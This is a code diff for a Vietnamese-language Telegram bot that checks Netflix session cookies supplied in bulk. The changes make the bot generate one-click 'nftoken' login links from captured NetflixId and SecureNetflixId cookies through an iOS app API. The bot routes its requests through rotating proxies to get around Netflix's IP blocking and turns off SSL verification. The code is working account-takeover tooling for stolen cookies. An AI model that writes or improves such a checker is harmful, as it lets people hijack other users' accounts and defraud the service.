@@ -15,7 +15,6 @@ import requests
 import telebot
 from urllib3.exceptions import InsecureRequestWarning
 
-# Tắt cảnh báo SSL
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # 🔴 THAY THẾ TOKEN BOT CỦA BẠN VÀO ĐÂY (Lấy từ @BotFather)
@@ -41,11 +40,8 @@ def _build_proxy_dict(scheme, host, port, user=None, password=None):
 def _parse_proxy_line(line):
     line = line.strip()
     if not line or line.startswith("#"): return None
-    
-    # Tự động sửa nếu người dùng quên điền http:// hoặc https:// ở đầu file proxy thô
     if not re.match(r'^[a-zA-Z][a-zA-Z0-9+.-]*://', line):
         line = "http://" + line
-
     url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
     if url_like:
         d = url_like.groupdict()
@@ -59,7 +55,6 @@ def load_proxies():
             for line in f:
                 p = _parse_proxy_line(line)
                 if p: proxies.append(p)
-    print(f"📡 Đã nạp thành công {len(proxies)} Proxy từ cấu hình file.")
     return proxies
 
 def canonicalize_netflix_cookie_name(name):
@@ -239,22 +234,38 @@ def country_code_to_flag(code):
     raw = str(code or "").strip().upper()
     return "".join(chr(127397 + ord(c)) for c in raw) if len(raw) == 2 and raw.isalpha() else "🌍"
 
+# 🔍 PHẦN NÂNG CẤP: BẮT MÃ LỖI CHI TIẾT TỪ ĐẦU RA API NETFLIX
 def create_nftoken(cookie_dict, proxy=None):
     netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
-    if not netflix_id: return None
+    secure_id = decode_netflix_value(cookie_dict.get("SecureNetflixId"))
+    
+    if not netflix_id: 
+        return "Lỗi: Thiếu trường Cookie 'NetflixId'"
+    if not secure_id:
+        return "Lỗi: Thiếu trường Cookie 'SecureNetflixId' (Bắt buộc cho App di động)"
+
     url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
     params = {"appVersion": "15.48.1", "device_type": "NFAPPL-02-", "idiom": "phone", "path": '["account","token","default"]', "responseFormat": "json"}
-    headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={netflix_id}", "x-netflix.argo.translated": "true"}
+    headers = {
+        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", 
+        "Cookie": f"NetflixId={netflix_id}; SecureNetflixId={secure_id}", 
+        "x-netflix.argo.translated": "true"
+    }
     try:
         r = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=12, verify=False)
         if r.status_code == 200:
             tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
-            if tk: return {"token": tk}
-        else:
-            print(f"⚠️ Hệ thống NFToken trả về mã lỗi HTTP: {r.status_code}")
+            if tk: return f"https://netflix.com/?nftoken={tk}"
+            return "Lỗi: Netflix nhận cookie nhưng từ chối trả Token cây JSON"
+        elif r.status_code == 403:
+            return "Lỗi 403 Forbidden: Netflix đã phát hiện và khóa IP của Server Render"
+        elif r.status_code == 429:
+            return "Lỗi 429: IP gửi yêu cầu quá nhanh, bị Netflix chặn tạm thời"
+        return f"Lỗi HTTP {r.status_code}: Không thể lấy mã phản hồi từ App"
+    except requests.exceptions.Timeout:
+        return "Lỗi Timeout: Đường truyền Proxy quá chậm, không phản hồi kịp"
     except Exception as e:
-        print(f"⚠️ Lỗi kết nối khi gọi API NFToken: {str(e)}")
-    return None
+        return f"Lỗi Kết Nối: {str(e)}"
 
 # =========================================================================
 # PHẦN 2: WEB SERVER GIẢ LẬP ĐỂ GIỮ RENDER KHÔNG BỊ DOWN
@@ -269,7 +280,6 @@ def run_dummy_web_server():
             self.end_headers()
             self.wfile.write("Bot Checker Netflix Online 24/7!".encode("utf-8"))
     with socketserver.TCPServer(("", port), DummyHandler) as httpd:
-        print(f"🌍 Web Server giả lập đang lắng nghe tại cổng: {port}")
         httpd.serve_forever()
 
 # =========================================================================
@@ -334,10 +344,7 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             session = requests.Session()
             session.cookies.update(cookies)
             
-            # Chọn proxy ngẫu nhiên từ file proxy.txt
             proxy = random.choice(proxies) if proxies else None
-            if not proxy:
-                print("⚠️ Cảnh báo: Không tìm thấy Proxy hợp lệ. Đang gọi trực tiếp bằng mạng máy chủ.")
             
             try:
                 r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, proxies=proxy, timeout=12)
@@ -355,14 +362,11 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     elif is_subscribed: status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt cước)"
                     else: status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
                     
-                    nftoken_link_str = ""
-                    if is_subscribed or account_on_hold:
-                        # Gửi kèm Proxy vào hàm sinh Token để Netflix không chặn IP của Render
-                        nftoken_data = create_nftoken(cookies, proxy=proxy)
-                        if nftoken_data and nftoken_data.get("token"):
-                            nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={nftoken_data['token']}"
-                        else:
-                            nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** _(Không thể tạo NFToken từ thiết bị hiện tại)_"
+                    nftoken_result = create_nftoken(cookies, proxy=proxy)
+                    if nftoken_result and nftoken_result.startswith("https://"):
+                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** {nftoken_result}"
+                    else:
+                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** _({nftoken_result})_"
                         
                     final_report += (
                         f"📝 **Tài khoản #{idx+1}**\n"
@@ -376,8 +380,8 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     success_count += 1
                     continue
             except Exception as check_err:
-                print(f"⚠️ Lỗi kết nối tài khoản: {str(check_err)}")
-            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc bị lỗi cấu hình Proxy.\n\n"
+                pass
+            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc lỗi mạng Proxy.\n\n"
 
         header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
         bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
@@ -394,6 +398,4 @@ def callback_restart(call):
 bot.set_my_commands([telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Hướng dẫn")])
 
 threading.Thread(target=run_dummy_web_server, daemon=True).start()
-
-print("🤖 Bot Telegram tích hợp Proxy vượt rào chặn đang khởi chạy...")
 bot.infinity_polling()
